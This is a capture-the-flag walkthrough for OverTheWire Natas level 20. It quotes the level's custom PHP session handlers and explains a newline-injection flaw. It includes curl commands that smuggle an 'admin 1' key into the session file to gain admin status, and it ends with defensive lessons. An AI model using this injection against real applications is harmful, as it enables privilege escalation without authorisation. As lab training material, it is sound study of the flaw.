> **Level Goal:** Find the password for the next level.

---

## Connection Details

| Field    | Value                                                        |
| -------- | ------------------------------------------------------------ |
| URL      | `http://natas20.natas.labs.overthewire.org`                  |
| Username | `natas20`                                                    |
| Password | *found in [Natas Level 18 → 19](natas-level-18-level-19.md)* |

---

## Tools Used

- A web browser
- **View sourcecode** — the page links to its own PHP source
- **`curl`** — to inject a newline into the session file

---

## Solution

### Step 1 — Open the URL

Navigate to `http://natas20.natas.labs.overthewire.org` and log in with the password from Level 19.

The page has a single **name** field. Submitting it stores your name in the session and displays it back. Click **View sourcecode**.

---

### Step 2 — Read the Source Code

This level replaces PHP's built-in session handling with custom read/write functions registered via `session_set_save_handler()`. Sessions are stored as flat text files on disk.

```php
<?php
function myread($sid) {
    // validates the session ID contains only allowed characters
    if(strspn($sid, "1234567890qwertyuiop...") != strlen($sid)) {
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) { return ""; }

    $data = file_get_contents($filename);  // read the entire session file
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {  // split into lines
        $parts = explode(" ", $line, 2);       // split each line on the FIRST space only
        if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];  // key = before space, value = after
    }
    return session_encode() ?: "";
}

function mywrite($sid, $data) {
    if(strspn($sid, "1234567890qwertyuiop...") != strlen($sid)) { return; }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        $data .= "$key $value\n";  // writes each session key as "<key> <value>\n"
    }
    file_put_contents($filename, $data);
    return true;
}

session_set_save_handler("myopen", "myclose", "myread", "mywrite", "mydestroy", "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];  // stores user input directly into the session
}

print_credentials();  // prints password only if $_SESSION["admin"] == 1
?>
```

`mywrite()` serialises the session by writing one line per key and deserialises by splitting on newlines, then splitting each line on the first space. Neither function sanitises values for newline characters.

If `$_REQUEST["name"]` contains `\n`, `mywrite()` writes it literally into the session file, creating a second line. `myread()` then parses that second line as a separate session key.

Submitting `name = "foo\nadmin 1"` causes `mywrite()` to write:

```
name foo
admin 1
```

When `myread()` parses this on the next request, it sets:

```php
$_SESSION["name"]  = "foo"
$_SESSION["admin"] = "1"
```

`print_credentials()` checks `$_SESSION["admin"] == 1` — that passes, and the password is printed.

---

### Step 3 — Inject the Payload

Two requests are needed: one to write the poisoned session file, one to read it back (since `print_credentials()` runs after `myread()` loads the session).

**Request 1 — write the poisoned session file:**

```bash
curl -u natas20:<password> \
     -c cookies.txt \
     "http://natas20.natas.labs.overthewire.org/index.php" \
     --data $'name=foo\nadmin 1'
```

`-c cookies.txt` saves the `PHPSESSID` cookie so request 2 reuses the same session. `$'...'` is bash's ANSI-C quoting — it interprets `\n` as a literal newline character in the POST body.

**Request 2 — read the session back and trigger `print_credentials()`:**

```bash
curl -u natas20:<password> \
     -b cookies.txt \
     "http://natas20.natas.labs.overthewire.org/index.php"
```

`-b cookies.txt` sends the saved `PHPSESSID`. The server calls `myread()`, parses both lines, sets `$_SESSION["admin"] = "1"`, and `print_credentials()` outputs the password.

Output:

```
You are an admin. The credentials for the next level are:
Username: natas21
Password: <password>
```

That is the password for [Natas Level 20 → 21](natas-level-20-level-21.md).

---

## Key Takeaways

- **Custom serialisation formats must sanitise newlines in values.** The session file format uses `\n` as a record delimiter and space as a key/value delimiter. Storing unsanitised user input as a value breaks both assumptions — input containing `\n` injects new records, and input containing a space before `\n` injects arbitrary keys with arbitrary values.
- **Two requests are required.** The first write poisons the session file. The second read parses the poisoned file and populates `$_SESSION`. Any injection that works through a write/read cycle needs both steps — submitting and immediately checking the same response won't work because `myread()` runs before `mywrite()` on any given request.
- **`session_set_save_handler()` is dangerous to implement manually.** PHP's built-in session serialisation handles encoding correctly. Rolling a custom line-based format re-introduces injection vulnerabilities that the standard implementation already solves.

---
